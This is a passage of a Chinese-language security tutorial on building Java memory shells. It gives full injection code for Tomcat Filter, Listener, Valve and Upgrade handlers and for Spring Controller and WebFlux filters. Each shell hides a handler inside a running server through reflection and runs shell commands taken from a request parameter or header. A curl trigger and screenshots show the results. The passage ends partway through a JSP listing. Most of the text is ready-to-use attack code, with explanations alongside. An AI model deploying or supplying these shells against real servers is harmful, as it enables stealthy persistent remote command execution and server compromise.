        standardContext.addFilterMapBefore(filterMap);
        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
        constructor.setAccessible(true);
        ApplicationFilterConfig applicationFilterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
        filterConfigs.put(filterName, applicationFilterConfig);
        out.print("[+]&nbsp;&nbsp;&nbsp;&nbsp;Malicious filter injection successful!<br>[+]&nbsp;&nbsp;&nbsp;&nbsp;Filter name: " + filterName + "<br>[+]&nbsp;&nbsp;&nbsp;&nbsp;Below is a list displaying filter names and their corresponding URL patterns:");
        out.println("<table border='1'>");
        out.println("<tr><th>Filter Name</th><th>URL Patterns</th></tr>");
        List<String[]> allUrlPatterns = new ArrayList<>();
        for (Object filterConfigObj : filterConfigs.values()) {
            if (filterConfigObj instanceof ApplicationFilterConfig) {
                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) filterConfigObj;
                String filtername = filterConfig.getFilterName();
                FilterDef filterdef = standardContext.findFilterDef(filtername);
                if (filterdef != null) {
                    FilterMap[] filterMaps = standardContext.findFilterMaps();
                    for (FilterMap filtermap : filterMaps) {
                        if (filtermap.getFilterName().equals(filtername)) {
                            String[] urlPatterns = filtermap.getURLPatterns();
                            allUrlPatterns.add(urlPatterns); // 将当前迭代的urlPatterns添加到列表中

                            out.println("<tr><td>" + filtername + "</td>");
                            out.println("<td>" + String.join(", ", urlPatterns) + "</td></tr>");
                        }
                    }
                }
            }
        }
        out.println("</table>");
        for (String[] urlPatterns : allUrlPatterns) {
            for (String pattern : urlPatterns) {
                if (!pattern.equals("/*")) {
                    out.println("[+]&nbsp;&nbsp;&nbsp;&nbsp;shell: http://localhost:8080/test" + pattern + "?cmd=ipconfig<br>");
                }
            }
        }
    }
%>
<%!
    private String getRandomString() {
        String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        StringBuilder randomString = new StringBuilder();
        for (int i = 0; i < 8; i++) {
            int index = (int) (Math.random() * characters.length());
            randomString.append(characters.charAt(index));
        }
        return randomString.toString();
    }
%>
```

效果如下：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117144501712.png)

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117145703582.png)

同样的，这里我也适配了中文编码，和一些提示性语句的输出。

### 3.2.2 servlet内存马demo代码分析

我们分开来分析，首先看这段代码：

```java
ServletContext servletContext = request.getSession().getServletContext();
Field appctx = servletContext.getClass().getDeclaredField("context");
appctx.setAccessible(true);
ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
Field stdctx = applicationContext.getClass().getDeclaredField("context");
stdctx.setAccessible(true);
StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
Field filterConfigsField = standardContext.getClass().getDeclaredField("filterConfigs");
filterConfigsField.setAccessible(true);
Map filterConfigs = (Map) filterConfigsField.get(standardContext);
```

先是获取当前的`servlet`上下文并拿到其私有字段`context`，然后设置可访问，这样就可以通过反射这个`context`字段的值，这个值是一个`ApplicationContext`对象；接着获取`ApplicationContext`的私有字段`context`并设置可访问，然后通过反射获取`ApplicationContext`的`context`字段的值，这个值是一个`StandardContext`对象；最后是获取`StandardContext`的私有字段`filterConfigs`，设置可访问之后通过反射获取`StandardContext`的`filterConfigs`字段的值。

中间的构造匿名类的部分就不说了，和之前的`Servlet`是很像的，别忘记最后的`filterChain.doFilter`就行。

然后是这段代码：

```java
FilterDef filterDef = new FilterDef();
filterDef.setFilterName(filterName);
filterDef.setFilterClass(filter.getClass().getName());
filterDef.setFilter(filter);
standardContext.addFilterDef(filterDef);
FilterMap filterMap = new FilterMap();
filterMap.setFilterName(filterName);
filterMap.addURLPattern("/*");
filterMap.setDispatcher(DispatcherType.REQUEST.name());
standardContext.addFilterMapBefore(filterMap);
Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
constructor.setAccessible(true);
ApplicationFilterConfig applicationFilterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
filterConfigs.put(filterName, applicationFilterConfig);
```

也就是定义我们自己的`filterDef`和`FilterMap`并加入到`srandardContext`中，接着反射获取 `ApplicationFilterConfig` 类的构造函数并将构造函数设置为可访问，然后创建了一个 `ApplicationFilterConfig` 对象的实例，接着将刚刚创建的实例添加到过滤器配置的 `Map` 中，`filterName` 为键，这样就可以将动态创建的过滤器配置信息加入应用程序的全局配置中。

需要注意的是，在`tomcat 7`及以前`FilterDef`和`FilterMap`这两个类所属的包名是：

```jsp
<%@ page import="org.apache.catalina.deploy.FilterMap" %>
<%@ page import="org.apache.catalina.deploy.FilterDef" %>
```

`tomcat 8`及以后，包名是这样的：

```jsp
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
```

由于这方面的区别，最好是直接都用反射去写这个`filter`内存马，具体`demo`参考：

> https://github.com/feihong-cs/memShell/blob/master/src/main/java/com/memshell/tomcat/FilterBasedWithoutRequestVariant.java

还有个需要注意的点就是，我给出的这个`demo`代码只适用于`tomcat 7`及以上，因为  `filterMap.setDispatcher(DispatcherType.REQUEST.name());`这行代码中用到的`DispatcherType`是在`Servlet 3.0`规范中才有的。

### 3.2.3 tomcat6下filter内存马的编写

这里直接贴出参考文章，后面有空的话，会在我的博客中补全这部分的研究：

> https://xz.aliyun.com/t/9914
>
> https://mp.weixin.qq.com/s/sAVh3BLYNHShKwg3b7WZlQ
>
> https://www.cnblogs.com/CoLo/p/16840371.html
>
> https://flowerwind.github.io/2021/10/11/tomcat6、7、8、9内存马/
>
> https://9bie.org/index.php/archives/960/
>
> https://github.com/xiaopan233/GenerateNoHard
>
> https://github.com/ax1sX/MemShell/tree/main/TomcatMemShell

## 3.3 Listener内存马

### 3.3.1 简单的Listener内存马demo编写

根据我们在上面的`2.9`节中所讨论的内容，我们可以得出以下结论：

如果我们想要写一个`Listener`内存马，需要经过以下步骤：

- 继承并编写一个恶意`Listener`
- 获取`StandardContext`
- 调用`StandardContext.addApplicationEventListener()`添加恶意`Listener`

由以上结论我们可以写出如下内存马`demo`：

```jsp
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>

<%!
    public class EvilListener implements ServletRequestListener {
        public void requestDestroyed(ServletRequestEvent sre) {
            HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
            if (req.getParameter("cmd") != null){
                InputStream in = null;
                try {
                    in = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",req.getParameter("cmd")}).getInputStream();
                    Scanner s = new Scanner(in, "GBK").useDelimiter("\\A");
                    String out = s.hasNext()?s.next():"";
                    Field requestF = req.getClass().getDeclaredField("request");
                    requestF.setAccessible(true);
                    Request request = (Request)requestF.get(req);
                    request.getResponse().setCharacterEncoding("GBK");
                    request.getResponse().getWriter().write(out);
                }
                catch (Exception ignored) {}
            }
        }
        public void requestInitialized(ServletRequestEvent sre) {}
    }
%>

<%
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext context = (StandardContext) req.getContext();
    EvilListener evilListener = new EvilListener();
    context.addApplicationEventListener(evilListener);
    out.println("[+]&nbsp;&nbsp;&nbsp;&nbsp;Inject Listener Memory Shell successfully!<br>[+]&nbsp;&nbsp;&nbsp;&nbsp;Shell url: http://localhost:8080/test/?cmd=ipconfig");
%>
```

效果如下：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117232349151.png)

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117232401259.png)

### 3.3.2 Listener内存马demo代码分析

最关键部分的代码如下：

```java
Field reqF = request.getClass().getDeclaredField("request");
reqF.setAccessible(true);
Request req = (Request) reqF.get(request);
StandardContext context = (StandardContext) req.getContext();
EvilListener evilListener = new EvilListener();
context.addApplicationEventListener(evilListener);
```

前面四行代码干一件事：获取`StandardContext`；后两行干代码干这两件事：实例化我们编写的恶意`Listener`，调用`addApplicationEventListener`方法加入到`applicationEventListenersList`中去，这样最终就会到`eventListener`。

# 四、Spring MVC框架型内存马

## 4.1 Spring Controller型内存马

### 4.1.1 简单的Spring Controller型内存马demo编写

由`2.11.2.2`节中的分析可知，要编写一个`spring controller`型内存马，需要经过以下步骤：

- 获取`WebApplicationContext`
- 获取`RequestMappingHandlerMapping`实例
- 通过反射获得自定义`Controller`的恶意方法的`Method`对象
- 定义`RequestMappingInfo`
- 动态注册`Controller`

代码如下：

```java
package org.example.springcontrollermemoryshellexample.demos.web;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.util.Scanner;

@RestController
public class TestEvilController {

    private String getRandomString() {
        String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        StringBuilder randomString = new StringBuilder();
        for (int i = 0; i < 8; i++) {
            int index = (int) (Math.random() * characters.length());
            randomString.append(characters.charAt(index));
        }
        return randomString.toString();
    }

    @RequestMapping("/inject")
    public String inject() throws Exception{
        String controllerName = "/" + getRandomString();
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
        Method method = InjectedController.class.getMethod("cmd");
        PatternsRequestCondition urlPattern = new PatternsRequestCondition(controllerName);
        RequestMethodsRequestCondition condition = new RequestMethodsRequestCondition();
        RequestMappingInfo info = new RequestMappingInfo(urlPattern, condition, null, null, null, null, null);
        InjectedController injectedController = new InjectedController();
        requestMappingHandlerMapping.registerMapping(info, injectedController, method);
        return "[+] Inject successfully!<br>[+] shell url: http://localhost:8080" + controllerName + "?cmd=ipconfig";
    }

    @RestController
    public static class InjectedController {

        public InjectedController(){
        }

        public void cmd() throws Exception {
            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
            HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
            response.setCharacterEncoding("GBK");
            if (request.getParameter("cmd") != null) {
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in, "GBK").useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                response.getWriter().write(output);
                response.getWriter().flush();
                response.getWriter().close();
            }
        }
    }
}
```

运行效果：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118213242404.png)

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118213252847.png)

### 4.1.2 Spring Controller型内存马demo代码分析

代码的关键在于如下这几行：

```java
WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
Method method = InjectedController.class.getMethod("cmd");
PatternsRequestCondition urlPattern = new PatternsRequestCondition(controllerName);
RequestMethodsRequestCondition condition = new RequestMethodsRequestCondition();
RequestMappingInfo info = new RequestMappingInfo(urlPattern, condition, null, null, null, null, null);
InjectedController injectedController = new InjectedController();
requestMappingHandlerMapping.registerMapping(info, injectedController, method);
```

这段代码先利用`RequestContextHolder`获取当前请求的`WebApplicationContext`，这个`RequestContextHolder`是`Spring`框架提供的用于存储和访问请求相关信息的工具类；接着从上一步中获取到的`WebApplicationContext`中获取`RequestMappingHandlerMapping Bean`；接着通过反射获得我们自定义`Controller`的恶意方法的`Method`对象，然后就是拿到对应的`RequestMappingInfo`对象；通过`bean`实例+处理请求的`method`+对应的`RequestMappinginfo`对象即可调用`registerMapping`方法动态添加恶意`controller`。

## 4.2 Spring Interceptor型内存马

由`2.11.2.3`节的分析我们很容易得出`Spring Interceptor`型内存马的编写思路：

- 获取`ApplicationContext`
- 通过`AbstractHandlerMapping`反射来获取`adaptedInterceptors`
- 将要注入的恶意拦截器放入到`adaptedInterceptors`中

具体代码我会放到针对实际中间件打内存马那里。

## 4.3 Spring WebFlux内存马

### 4.3.1 简单的Spring WebFlux内存马demo编写

由`2.12.5`节的分析我们可以写出下面的代码：

```java
package org.example.webfluxmemoryshelldemo.memoryshell;

import org.springframework.boot.web.embedded.netty.NettyWebServer;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.io.buffer.DataBuffer;
import org.springframework.core.io.buffer.DefaultDataBufferFactory;
import org.springframework.http.MediaType;
import org.springframework.http.server.reactive.ReactorHttpHandlerAdapter;
import org.springframework.http.server.reactive.ServerHttpRequest;
import org.springframework.http.server.reactive.ServerHttpResponse;
import org.springframework.web.server.ServerWebExchange;
import org.springframework.web.server.WebFilter;
import org.springframework.web.server.WebFilterChain;
import org.springframework.web.server.WebHandler;
import org.springframework.web.server.adapter.HttpWebHandlerAdapter;
import org.springframework.web.server.handler.DefaultWebFilterChain;
import org.springframework.web.server.handler.ExceptionHandlingWebHandler;
import org.springframework.web.server.handler.FilteringWebHandler;
import reactor.core.publisher.Flux;
import reactor.core.publisher.Mono;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;

@Configuration
public class MemoryShellFilter implements WebFilter{

    public static void doInject() {
        Method getThreads;
        try {
            getThreads = Thread.class.getDeclaredMethod("getThreads");
            getThreads.setAccessible(true);
            Object threads = getThreads.invoke(null);
            for (int i = 0; i < Array.getLength(threads); i++) {
                Object thread = Array.get(threads, i);
                if (thread != null && thread.getClass().getName().contains("NettyWebServer")) {
                    NettyWebServer nettyWebServer = (NettyWebServer) getFieldValue(thread, "this$0", false);
                    ReactorHttpHandlerAdapter reactorHttpHandlerAdapter = (ReactorHttpHandlerAdapter) getFieldValue(nettyWebServer, "handler", false);
                    Object delayedInitializationHttpHandler = getFieldValue(reactorHttpHandlerAdapter,"httpHandler", false);
                    HttpWebHandlerAdapter httpWebHandlerAdapter = (HttpWebHandlerAdapter) getFieldValue(delayedInitializationHttpHandler,"delegate", false);
                    ExceptionHandlingWebHandler exceptionHandlingWebHandler = (ExceptionHandlingWebHandler) getFieldValue(httpWebHandlerAdapter,"delegate", true);
                    FilteringWebHandler filteringWebHandler = (FilteringWebHandler) getFieldValue(exceptionHandlingWebHandler,"delegate", true);
                    DefaultWebFilterChain defaultWebFilterChain = (DefaultWebFilterChain) getFieldValue(filteringWebHandler,"chain", false);
                    Object handler = getFieldValue(defaultWebFilterChain, "handler", false);
                    List<WebFilter> newAllFilters = new ArrayList<>(defaultWebFilterChain.getFilters());
                    newAllFilters.add(0, new MemoryShellFilter());
                    DefaultWebFilterChain newChain = new DefaultWebFilterChain((WebHandler) handler, newAllFilters);
                    Field f = filteringWebHandler.getClass().getDeclaredField("chain");
                    f.setAccessible(true);
                    Field modifersField = Field.class.getDeclaredField("modifiers");
                    modifersField.setAccessible(true);
                    modifersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);
                    f.set(filteringWebHandler, newChain);
                    modifersField.setInt(f, f.getModifiers() & Modifier.FINAL);
                }
            }
        } catch (Exception ignored) {}
    }

    public static Object getFieldValue(Object obj, String fieldName,boolean superClass) throws Exception {
        Field f;
        if(superClass){
            f = obj.getClass().getSuperclass().getDeclaredField(fieldName);
        }else {
            f = obj.getClass().getDeclaredField(fieldName);
        }
        f.setAccessible(true);
        return f.get(obj);
    }

    public Flux<DataBuffer> getPost(ServerWebExchange exchange) {
        ServerHttpRequest request = exchange.getRequest();
        String path = request.getURI().getPath();
        String query = request.getURI().getQuery();

        if (path.equals("/evil/cmd") && query != null && query.startsWith("command=")) {
            String command = query.substring(8);
            try {
                Process process = Runtime.getRuntime().exec("cmd /c" + command);
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream(), "GBK"));
                Flux<DataBuffer> response = Flux.create(sink -> {
                    try {
                        String line;
                        while ((line = reader.readLine()) != null) {
                            sink.next(DefaultDataBufferFactory.sharedInstance.wrap(line.getBytes(StandardCharsets.UTF_8)));
                        }
                        sink.complete();
                    } catch (IOException ignored) {}
                });

                exchange.getResponse().getHeaders().setContentType(MediaType.TEXT_PLAIN);
                return response;
            } catch (IOException ignored) {}
        }
        return Flux.empty();
    }

    @Override
    public Mono<Void> filter(ServerWebExchange exchange, WebFilterChain chain) {
        if (exchange.getRequest().getURI().getPath().startsWith("/evil/")) {
            doInject();
            Flux<DataBuffer> response = getPost(exchange);
            ServerHttpResponse serverHttpResponse = exchange.getResponse();
            serverHttpResponse.getHeaders().setContentType(MediaType.TEXT_PLAIN);
            return serverHttpResponse.writeWith(response);
        } else {
            return chain.filter(exchange);
        }
    }
}
```

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240126191718261.png)

### 4.3.2 Spring WebFlux内存马demo代码分析

从之前的分析我们知道，主要思路就是通过反射找到`DefaultWebFilterChain`，然后拿到`filters`，把我们的`filter`插入到其中的第一位，再用这个`filters`重新调用公共构造函数`DefaultWebFilterChain`，赋值给之前分析里面我没看到的`this.chain`即可。

思路就是这么个思路，我们来看具体的代码。

先是通过反射来获取当前运行的所有线程组，然后遍历线程数组，检查每个线程是否为`NettyWebServer`实例。如果发现一个线程是`NettyWebServer`，那就继续下一步的操作。接下来就是找`DefaultWebFilterChain`对象：

```java
NettyWebServer nettyWebServer = (NettyWebServer) getFieldValue(thread, "this$0", false);
ReactorHttpHandlerAdapter reactorHttpHandlerAdapter = (ReactorHttpHandlerAdapter) getFieldValue(nettyWebServer, "handler", false);
Object delayedInitializationHttpHandler = getFieldValue(reactorHttpHandlerAdapter,"httpHandler", false);
HttpWebHandlerAdapter httpWebHandlerAdapter = (HttpWebHandlerAdapter) getFieldValue(delayedInitializationHttpHandler,"delegate", false);
ExceptionHandlingWebHandler exceptionHandlingWebHandler = (ExceptionHandlingWebHandler) getFieldValue(httpWebHandlerAdapter,"delegate", true);
FilteringWebHandler filteringWebHandler = (FilteringWebHandler) getFieldValue(exceptionHandlingWebHandler,"delegate", true);
DefaultWebFilterChain defaultWebFilterChain = (DefaultWebFilterChain) getFieldValue(filteringWebHandler,"chain", false);
```

这条链子在之前的分析中已经提到过，一步步调用我们写的`getFieldValue`函数即可。

然后就是修改这个过滤器链，添加我们自定义的恶意filter，并把它放到第一位：

```java
Object handler = getFieldValue(defaultWebFilterChain, "handler", false);
List<WebFilter> newAllFilters = new ArrayList<>(defaultWebFilterChain.getFilters());
newAllFilters.add(0, new MemoryShellFilter());
DefaultWebFilterChain newChain = new DefaultWebFilterChain((WebHandler) handler, newAllFilters);
```

然后通过反射获取`FilteringWebHandler`的私有字段`chain`，设置为可访问之后，通过反射将原始的过滤器链替换为新创建的过滤器链`newChain`，然后恢复字段的可访问权限：

```java
Field f = filteringWebHandler.getClass().getDeclaredField("chain");
f.setAccessible(true);
Field modifersField = Field.class.getDeclaredField("modifiers");
modifersField.setAccessible(true);
modifersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);
f.set(filteringWebHandler, newChain);
modifersField.setInt(f, f.getModifiers() & Modifier.FINAL);
```

这里补充一下上面的`modifersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);`和`modifersField.setInt(f, f.getModifiers() & Modifier.FINAL);`的含义，第一个代码意思就是使用反射机制，通过`modifersField`对象来修改字段的修饰符，`f.getModifiers()`返回字段`f`的当前修饰符，然后通过位运算`& ~Modifier.FINAL`，将当前修饰符的`FINAL`位清除（置为`0`），表示移除了`FINAL`修饰符；第二个则是把字段的修饰符重新设置为包含`FINAL`修饰符的修饰符，这样就可以保持字段的封装性。

# 五、中间件型内存马

## 5.1 Tomcat Valve型内存马

我这里是新建了一个项目，并创建配置好了`web`目录和`tomcat`环境，`pom.xml`中的依赖如下：

```xml
    <dependencies>
        <dependency>
            <groupId>org.apache.tomcat</groupId>
            <artifactId>tomcat-catalina</artifactId>
            <version>9.0.83</version>
        </dependency>
    </dependencies>
```

> 如果idea启动tomcat报错，可以看看是不是你开了网易云哈哈哈：
>
> ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130181221187.png)

在`web`目录下新建一个`666.jsp`：

```jsp
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.valves.ValveBase" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.catalina.core.*" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%
    Field requestField = request.getClass().getDeclaredField("request");
    requestField.setAccessible(true);
    final Request req = (Request) requestField.get(request);
    StandardContext standardContext = (StandardContext) req.getContext();
    Field pipelineField = ContainerBase.class.getDeclaredField("pipeline");
    pipelineField.setAccessible(true);
    StandardPipeline evilStandardPipeline = (StandardPipeline) pipelineField.get(standardContext);
    ValveBase evilValve = new ValveBase() {
        @Override
        public void invoke(Request request, Response response) throws ServletException,IOException {
            if (request.getParameter("cmd") != null) {
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in, "GBK").useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                response.setCharacterEncoding("GBK");
                PrintWriter out = response.getWriter();
                out.println(output);
                out.flush();
                out.close();
                this.getNext().invoke(request, response);
            }
        }
    };
    evilStandardPipeline.addValve(evilValve);
    out.println("inject success");
%>
```

上面的这个是采用了从`StandardContext`反射获取`StandardPipeline`的方式，效果如下：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130164016715.png)

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130164029228.png)

下面的则是调用 `standardContext.getPipeline().addValve`实现的：

```jsp
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.valves.ValveBase" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.catalina.core.*" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%
  class testEvilValve extends ValveBase {
    @Override
    public void invoke(Request request, Response response) throws ServletException,IOException {
      if (request.getParameter("command") != null) {
        boolean isLinux = true;
        String osTyp = System.getProperty("os.name");
        if (osTyp != null && osTyp.toLowerCase().contains("win")) {
          isLinux = false;
        }
        String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("command")} : new String[]{"cmd.exe", "/c", request.getParameter("command")};
        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
        Scanner s = new Scanner(in, "GBK").useDelimiter("\\A");
        String output = s.hasNext() ? s.next() : "";
        response.setCharacterEncoding("GBK");
        PrintWriter out = response.getWriter();
        out.println(output);
        out.flush();
        out.close();
        this.getNext().invoke(request, response);
      }
    }
  };
%>

<%
  Field requestField = request.getClass().getDeclaredField("request");
  requestField.setAccessible(true);
  final Request req = (Request) requestField.get(request);
  StandardContext standardContext = (StandardContext) req.getContext();
  standardContext.getPipeline().addValve(new testEvilValve());
  out.println("inject success");
%>
```

效果如下：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130164109133.png)

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130164219944.png)

## 5.2 Tomcat Upgrade内存马

由`2.14.2`节中的分析，我们可以写出如下`java`代码：

```java
package org.example;

import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.apache.catalina.connector.Connector;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.Request;
import org.apache.coyote.Adapter;
import org.apache.coyote.Processor;
import org.apache.coyote.UpgradeProtocol;
import org.apache.coyote.Response;
import org.apache.coyote.http11.AbstractHttp11Protocol;
import org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler;
import org.apache.tomcat.util.net.SocketWrapperBase;
import java.lang.reflect.Field;
import java.nio.ByteBuffer;
import java.util.HashMap;

@WebServlet("/evil")
public class TestUpgrade extends HttpServlet {

    static class MyUpgrade implements UpgradeProtocol {
        @Override
        public String getHttpUpgradeName(boolean b) {
            return null;
        }

        @Override
        public byte[] getAlpnIdentifier() {
            return new byte[0];
        }

        @Override
        public String getAlpnName() {
            return null;
        }

        @Override
        public Processor getProcessor(SocketWrapperBase<?> socketWrapperBase, Adapter adapter) {
            return null;
        }

        @Override
        public InternalHttpUpgradeHandler getInternalUpgradeHandler(SocketWrapperBase<?> socketWrapperBase, Adapter adapter, org.apache.coyote.Request request) {
            return null;
        }

        @Override
        public boolean accept(org.apache.coyote.Request request) {
            String p = request.getHeader("cmd");
            try {
                String[] cmd = System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"cmd.exe", "/c", p} : new String[]{"/bin/sh", "-c", p};
                Field response = org.apache.coyote.Request.class.getDeclaredField("response");
                response.setAccessible(true);
                Response resp = (Response) response.get(request);
                byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream(), "GBK").useDelimiter("\\A").next().getBytes();
                resp.setCharacterEncoding("GBK");
                resp.doWrite(ByteBuffer.wrap(result));
            } catch (Exception ignored) {}
            return false;
        }
    }
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
        try {
            RequestFacade rf = (RequestFacade) req;
            Field requestField = RequestFacade.class.getDeclaredField("request");
            requestField.setAccessible(true);
            Request request1 = (Request) requestField.get(rf);

            Field connector = Request.class.getDeclaredField("connector");
            connector.setAccessible(true);
            Connector realConnector = (Connector) connector.get(request1);

            Field protocolHandlerField = Connector.class.getDeclaredField("protocolHandler");
            protocolHandlerField.setAccessible(true);
            AbstractHttp11Protocol handler = (AbstractHttp11Protocol) protocolHandlerField.get(realConnector);

            HashMap<String, UpgradeProtocol> upgradeProtocols;
            Field upgradeProtocolsField = AbstractHttp11Protocol.class.getDeclaredField("httpUpgradeProtocols");
            upgradeProtocolsField.setAccessible(true);
            upgradeProtocols = (HashMap<String, UpgradeProtocol>) upgradeProtocolsField.get(handler);

            MyUpgrade myUpgrade = new MyUpgrade();
            upgradeProtocols.put("hello", myUpgrade);

            upgradeProtocolsField.set(handler, upgradeProtocols);
        } catch (Exception ignored) {}
    }
}
```

运行之后执行命令`curl -H "Connection: Upgrade" -H "Upgrade: hello" -H "cmd: dir" http://localhost:8080/evil`，结果如下：

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240131162725549.png)

`jsp`版本为：

```jsp
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Connector" %>
<%@ page import="org.apache.coyote.http11.AbstractHttp11Protocol" %>
<%@ page import="org.apache.coyote.UpgradeProtocol" %>
<%@ page import="java.util.HashMap" %>
<%@ page import="org.apache.coyote.Processor" %>
<%@ page import="org.apache.tomcat.util.net.SocketWrapperBase" %>
<%@ page import="org.apache.coyote.Adapter" %>
<%@ page import="org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="java.nio.ByteBuffer" %>
<%
    class MyUpgrade implements UpgradeProtocol {
        public String getHttpUpgradeName(boolean isSSLEnabled) {
            return "hello";
        }

        public byte[] getAlpnIdentifier() {
            return new byte[0];
        }

        public String getAlpnName() {
            return null;
        }

        public Processor getProcessor(SocketWrapperBase<?> socketWrapper, Adapter adapter) {
            return null;
        }

        @Override
        public InternalHttpUpgradeHandler getInternalUpgradeHandler(SocketWrapperBase<?> socketWrapper, Adapter adapter, org.apache.coyote.Request request) {
            return null;
        }

        @Override
        public boolean accept(org.apache.coyote.Request request) {
            String p = request.getHeader("cmd");
            try {
                String[] cmd = System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"cmd.exe", "/c", p} : new String[]{"/bin/sh", "-c", p};
                Field response = org.apache.coyote.Request.class.getDeclaredField("response");
                response.setAccessible(true);
                org.apache.coyote.Response resp = (org.apache.coyote.Response) response.get(request);
